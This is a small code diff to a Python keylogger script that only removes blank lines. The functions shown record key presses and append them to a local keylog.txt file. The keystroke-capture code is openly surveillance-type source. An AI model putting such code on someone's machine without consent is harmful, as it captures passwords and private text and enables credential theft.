@@ -5,10 +5,8 @@ log = [] # empty list
 
 def on_press(key):
     global count, log
-
     log.append(key)
     count += 1 # for every key increment
-
     if count >=5:
         count = 0
         write_file(log)
@@ -21,10 +19,8 @@ def on_release(key):
 
 def write_file(log): # argument is list that contains keys
     f = open("keylog.txt","a") # a = append mode
-
     for key in log:
         current_key = str(key).replace("'","") # removes single quotes around all words
-
         if current_key == "Key.space":
             f.write('\n')
         else:
